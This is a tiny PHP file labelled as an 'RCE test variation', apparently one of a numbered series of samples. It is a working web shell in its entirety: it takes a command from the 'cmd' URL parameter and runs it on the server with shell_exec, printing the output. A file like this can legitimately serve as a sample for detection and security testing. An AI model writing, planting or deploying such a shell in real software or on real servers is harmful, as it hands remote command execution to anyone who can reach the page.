<?php
// RCE test variation #872
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>